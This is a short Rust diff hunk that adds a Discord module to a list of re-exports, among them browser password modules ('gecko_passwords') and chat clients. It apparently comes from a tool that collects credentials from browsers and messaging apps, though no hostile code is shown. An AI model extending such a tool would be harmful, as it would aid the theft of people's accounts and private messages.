@@ -25,6 +25,7 @@ pub use browser::chromium;
 pub use browser::gecko;
 pub use browser::gecko_passwords;
 
+pub use communication::discord;
 pub use communication::jabber;
 pub use communication::messenger;
 
